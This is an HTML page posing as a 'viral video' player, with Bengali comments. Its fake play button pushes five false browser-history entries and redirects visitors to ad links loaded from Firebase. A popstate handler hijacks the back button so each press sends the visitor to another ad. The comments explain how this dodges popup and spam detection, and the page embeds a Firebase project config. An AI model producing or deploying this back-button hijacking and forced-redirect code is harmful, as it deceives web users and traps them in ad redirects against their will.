<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Viral video Play now</title>

<!-- Firebase JS SDK -->
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

<style>
body{ margin:0; background:black; font-family:Arial; color:white; }
.topbar{ background:#f1f1f1; color:black; padding:10px; font-weight:bold; }

.video {
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    position: relative;
    background-size: cover;
    background-position: center;
    background-repeat: no-repeat;
    background-image: url('https://images.unsplash.com/photo-1536440136628-849c177e76a1?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80'); 
    transition: background-image 0.5s ease-in-out; 
}

.play {
    width: 120px; height: 120px; border-radius: 50%; border: 3px solid white;
    display: flex; justify-content: center; align-items: center;
    font-size: 50px; box-shadow: 0 0 30px white; cursor: pointer;
    background: rgba(0, 0, 0, 0.4); 
    position: relative;
    z-index: 10;
}

.controls {
    position: fixed; bottom: 0; width: 100%; padding: 10px; background: rgba(0,0,0,0.8);
    z-index: 10;
}
.progress { height: 6px; background: #333; margin-bottom: 8px; }
.bar { width: 20%; height: 100%; background: white; }
.time { display: flex; justify-content: space-between; font-size: 14px; }
</style>
</head>

<body>

<div class="video" id="videoBg">
    <div class="play" onclick="openLink()">▶</div>
</div>

<div class="controls">
    <div class="progress"><div class="bar"></div></div>
    <div class="time"><span>0:11</span><span>8:32</span></div>
</div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyC2tguQFjkUvncBvn6-e7_Ux5vJ6lEzpjQ",
        authDomain: "vital-1f05b.firebaseapp.com",
        databaseURL: "https://vital-1f05b-default-rtdb.firebaseio.com",
        projectId: "vital-1f05b",
        storageBucket: "vital-1f05b.firebasestorage.app",
        messagingSenderId: "992463011532",
        appId: "1:992463011532:web:708ff147b8e7e1ce5b8c69"
    };

    if (!firebase.apps.length) {
        firebase.initializeApp(firebaseConfig);
    }
    const db = firebase.database();
    const maxRedirects = 5;

    // ফায়ারবেস থেকে ডাটা নিয়ে আসা
    function fetchSettings() {
        db.ref('playerSettings').on('value', (snapshot) => {
            const data = snapshot.val();
            if (data) {
                if (data.bgImage && data.bgImage.trim() !== "") {
                    document.getElementById('videoBg').style.backgroundImage = `url('${data.bgImage}')`;
                }
                const links = [data.link1, data.link2, data.link3, data.link4, data.link5];
                sessionStorage.setItem('targetLinks', JSON.stringify(links));
            }
        });
    }

    // প্লে বাটনে ক্লিক করলে আসল ম্যাজিক শুরু হবে!
    function openLink() {
        let linksData = sessionStorage.getItem('targetLinks');
        
        if (!linksData) {
            alert("ডেটা লোড হচ্ছে, দয়া করে ২ সেকেন্ড অপেক্ষা করুন...");
            return;
        }

        let targetLinks = JSON.parse(linksData);

        // যেহেতু ইউজার ক্লিক করেছে, তাই ব্রাউজার এখন আমাদের ব্লক করবে না!
        // এই সুযোগে আমরা একসাথে ৫টি ফেক হিস্ট্রি পুশ করে দিব।
        for (let i = maxRedirects; i >= 1; i--) {
            // URL এর শেষে ?step=5, ?step=4 লাগিয়ে ফেক পেজ তৈরি করা হলো
            history.pushState({ hijackStep: i }, "Step " + i, window.location.pathname + "?step=" + i);
        }

        // অ্যাড কাউন্ট ১ সেট করা হলো
        sessionStorage.setItem('adCount', 1);

        // এবার ১ম লিংকে পাঠিয়ে দিব
        window.location.href = targetLinks[0] || "https://google.com";
    }

    // ইউজার ব্যাক বাটনে চাপলে এই ফাংশন হিট করবে (যেহেতু ফেক হিস্ট্রি পুশ করা আছে)
    window.addEventListener('popstate', function(event) {
        let linksData = sessionStorage.getItem('targetLinks');
        if (!linksData) return;
        
        let targetLinks = JSON.parse(linksData);
        let adCount = parseInt(sessionStorage.getItem('adCount')) || 1;

        // event.state চেক করে নিশ্চিত হওয়া যে ইউজার আমাদের ফেক পেজে পড়েছে
        if (event.state && event.state.hijackStep) {
            
            if (adCount < maxRedirects) {
                let nextLink = targetLinks[adCount] || "https://google.com";
                sessionStorage.setItem('adCount', adCount + 1);
                
                // location.replace ব্যবহার করা হলো যাতে ব্রাউজার স্প্যাম মনে না করে
                window.location.replace(nextLink);
            } 
            else {
                // ৫টি অ্যাড শেষ! এখন ইউজার মেইন পেজে ফিরে আসবে
                history.replaceState(null, "", window.location.pathname); // URL ঠিক করা হলো
                alert("৫টি এড শেষ! এখন অরিজিনাল ভিডিও প্লে হচ্ছে...");
                // এখানে আপনার ভিডিও প্লেয়ারের কোড বসাতে পারেন
            }
        }
    });

    fetchSettings();
</script>

</body>
</html>
